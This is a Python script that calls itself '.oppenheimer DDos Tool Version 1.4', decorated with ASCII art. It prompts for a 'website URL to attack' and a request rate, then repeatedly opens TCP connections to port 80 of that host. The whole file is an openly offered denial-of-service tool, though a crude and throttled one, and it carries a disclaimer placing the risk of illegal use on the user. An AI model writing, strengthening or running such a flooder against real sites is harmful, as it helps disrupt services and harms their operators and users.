import socket
import time

def check_website(website, requests_per_second=None):
    try:
        socket.setdefaulttimeout(5)  
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((website, 80))
            s.close()
            print(f"PING to {website} is successful.")
            if requests_per_second:
                time.sleep(1 / requests_per_second)
            else:
                time.sleep(1)  
    except (socket.timeout, socket.error):
        print(f"Connection to {website} failed.")

def main():
    print(r'''
    ⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⡴⢾⠅⠀⠀⠀⠉⠁⠉⠉⠰⡤⢀⠀⠀⠀
⠀⢀⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡷⡀⠀
⠀⢞⢆⠀⠀⠀⠀⠀⠀⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⢧⠀
⠀⠀⠫⢄⣠⣤⣄⣤⣿⠛⠟⠻⢻⣿⣆⠀⢀⣠⣤⠞⠀
⠀⠀⠀⠀⠈⠉⠉⠛⢻⠀⠀⠀⢸⠿⠛⠛⠋⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⠽⡀⡀⣰⠸⢤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡊⠀⠀⡀⢀⡁⣀⣀⠀⠀⣼⠆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠙⠛⢻⢹⠋⡋⣿⠛⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠤⠀⣰⣞⠸⠀⠇⢸⠖⡐⠄⠀⠀⠀⠀⠀
⠀⣀⣴⣾⣿⣿⣾⣠⣏⠀⡤⣠⡈⢧⣝⣷⣶⣄⡀⠀⠀
⠈⠀⠁⠈⠙⠹⠿⠿⠷⠻⡿⣿⠿⠿⠿⠻⠻⠯⠻⠖⡆
                                        .__             .__                          
  ____  ______  ______    ____    ____  |  |__    ____  |__|  _____    ____ _______  
 /  _ \ \____ \ \____ \ _/ __ \  /    \ |  |  \ _/ __ \ |  | /     \ _/ __ \\_  __ \ 
(  <_> )|  |_> >|  |_> >\  ___/ |   |  \|   Y  \\  ___/ |  ||  Y Y  \\  ___/ |  | \/ 
 \____/ |   __/ |   __/  \___  >|___|  /|___|  / \___  >|__||__|_|  / \___  >|__|    
        |__|    |__|         \/      \/      \/      \/           \/      \/         
                                                                                       
    ''')
    print("Welcome to the .oppenheimer DDos Tool Version 1.4 By Iyar")
    print("Any illegal step in the software is at your own risk!")
    website = input("Enter website URL to attack: ")
    while True:
        requests_per_second = input("Enter the number of PING requests per second : ")
        if not requests_per_second or requests_per_second.isdigit():
            break
        print("Invalid input. Please enter a positive integer or leave empty.")
    
    if requests_per_second:
        requests_per_second = int(requests_per_second)
    check_website(website, requests_per_second)

if __name__ == "__main__":
    main()

